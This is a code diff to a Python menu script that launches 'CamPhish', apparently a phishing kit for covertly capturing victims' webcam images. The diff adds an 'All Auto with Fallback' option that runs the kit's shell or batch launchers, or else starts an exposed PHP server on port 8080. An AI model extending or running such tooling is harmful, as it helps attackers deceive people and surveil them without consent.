@@ -76,6 +76,7 @@ def show_menu():
     print(f"{CYAN}[3]{WHITE} Real-Time Monitor (Full Features)")
     print(f"{CYAN}[4]{WHITE} Real-Time Monitor (Basic)")
     print(f"{CYAN}[5]{WHITE} CamPhish AUTO with Silent Monitor (Recommended)")
+    print(f"{CYAN}[6]{WHITE} All Auto with Fallback (Universal)")
     print(f"{CYAN}[0]{WHITE} Exit")
 
 def execute_command(command):
@@ -131,6 +132,36 @@ def run_camphish_with_monitor():
         time.sleep(3)
     finally:
         os.chdir(INITIAL_DIR)
+def run_all_auto_with_fallback():
+    clear_screen()
+    print(f"{GREEN}Starting All Auto with Universal Fallback...")
+    print(f"{CYAN}This will try multiple methods to run CamPhish with all features")
+    time.sleep(2)
+    try:
+        os.chdir("CamPhish")
+        clear_screen()
+        print(f"{MAGENTA}Attempting universal CamPhish launcher...")
+        time.sleep(2)
+        
+        system_os = platform.system()
+        
+        if system_os == "Windows":
+            print(f"{CYAN}Windows detected - trying run-camphish.bat fallback...")
+            execute_command(['run-camphish.bat'])
+        else:
+            print(f"{CYAN}Linux/Mac detected - using universal launcher...")
+            execute_command(['bash', 'run_universal.sh'])
+            
+    except FileNotFoundError:
+        print(f"{RED}Universal launcher not found. Trying direct methods...")
+        # Try direct bash script
+        try:
+            execute_command(['bash', 'camphish_auto.sh'])
+        except:
+            print(f"{RED}Bash failed. Starting PHP server only...")
+            execute_command(['php', '-S', '0.0.0.0:8080'])
+    finally:
+        os.chdir(INITIAL_DIR)
 def run_monitor(monitor_type):
     clear_screen()
     if monitor_type == "full":
@@ -182,6 +213,9 @@ def main():
             elif choice == '5':
                 run_camphish_with_monitor()
                 input(f"\n{GREEN}CamPhish dengan monitor dihentikan. Tekan Enter untuk kembali ke menu.")
+            elif choice == '6':
+                run_all_auto_with_fallback()
+                input(f"\n{GREEN}All Auto dengan fallback dihentikan. Tekan Enter untuk kembali ke menu.")
             elif choice == '0':
                 clear_screen()
                 print(f"{CYAN}JUST HOPING TO BE HER HOPE :)")
